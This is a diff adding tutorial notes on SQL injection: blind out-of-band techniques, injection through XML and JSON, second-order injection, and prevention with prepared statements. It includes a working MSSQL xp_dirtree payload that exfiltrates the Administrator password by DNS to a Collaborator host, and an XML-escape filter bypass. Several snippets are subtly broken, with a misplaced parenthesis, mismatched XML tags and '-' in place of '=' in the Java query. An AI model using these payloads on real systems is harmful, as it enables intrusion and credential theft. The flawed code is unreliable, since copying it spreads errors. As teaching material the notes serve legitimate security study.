@@ -282,3 +282,62 @@ The first input here will not trigger a delay as the condition is false. The sec
 Using this technique, data can be retrieved one character at a time:
 `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1 > 'm') = 1 WAITFOR DELAY '0:0:02'--`
 
+# Exploiting Blind SQLi Using Out-of-Band (OAST) Techniques
+
+If an app carries out SQL queries asynchronously i.e. it processes the users request in one thread, and the SQL query in another, then the techniques covered so far will not work. This is because the app response no longer relies on the query returning data, an error occurring or on the time taken to execute.
+
+It can be possible to exploit this still by triggering an out-of-band network interaction to a system you control. Data can be extracted directly within the network interaction. DNS is the most effective protocol to use for this, as most apps allow free egress of DNS queries.
+
+Burp Collaborator can be used to test out-of-band techniques. The following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
+`'; exec master..xp_dirtree '//abcdef.burpcollaborator.net/a'--`
+
+This would cause the database to perform a lookup for:
+`abcdef.burpcollaborator.net`
+
+Polling the Burp Collaborator would confirm a DNS lookup has occurred. If out-of-band interaction can be confirmed, then a payload like the following could be used to extract information:
+`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.abcdef.burpcollaborator.net/a"')--`
+
+This input reads the Administrator password, appends a Collaborator subdomain and triggers a DNS lookup, allowing the captured password to be viewed. OAST techniques are preferable even in situations where other techniques work, as they are very powerful.
+
+# SQLi in Different Contexts
+
+SQLi can be performed using any controllable input, meaning formats like JSON or XML can also be used to perform SQLi attacks. These formats may allow obfuscation, allowing attacks which would normally be blocked to get through. 
+
+If weak implementations of defence are used, like only checking for common SQLi keywords, methods like XML escape sequences can be used as a bypass:
+```
+<stockCheck>
+	<productId>123</productid>
+	<storeId>999 &#x53;ELECT * FROM infomration_schema.tables<storeId>
+</stockCheck>
+```
+
+# Second Order SQL Injection
+
+First-order SQL injection is when an app processes user input from a HTTP request and incorporates this into an SQL query in an unsafe way.
+
+Second-order SQL injection is when an app takes user input from a HTTP request and stores it for future use. Normally, this is done by placing the input into a database, there is no vulnerability at the data storage point. Later, when the app is handling a different HTTP request, it retrieves the stored data and incorporates it unsafely.
+
+This occurs when developers handle initial input safely by placing initial input into a database. Later, when the data is processed, it is deemed to be safe as it was previously placed safely, this results in the unsafe handling of the data.
+
+# Preventing SQLi
+
+Most instances of SQLi can be prevented by using parameterised queries instead of string concatenation, these are also known as "Prepared Statements". For example:
+```
+String query = "SELECT * FROM products WHERE category - '"+ input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);
+```
+
+This can be rewritten safely as:
+```
+PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+statement.setString(1,input);
+ResultSet resultSet = statement.executeQuery();
+```
+
+Prepared statements can be used where any untrusted input appears as data within a query, including the `WHERE` clause and values inside an `INSERT` or `UPDATE` statement. This can't be used to handle untrusted input in table or column names, or in the `ORDER BY` clause. App functionality that places untrusted data into those parts must be handled differently, for example:
+
+- Whitelist permitted input values
+- Use different app logic to permit the required behaviour
+
+For prepared statements to be effective, the string in use must always be a hard-coded constant, it cannot contain variable data. 
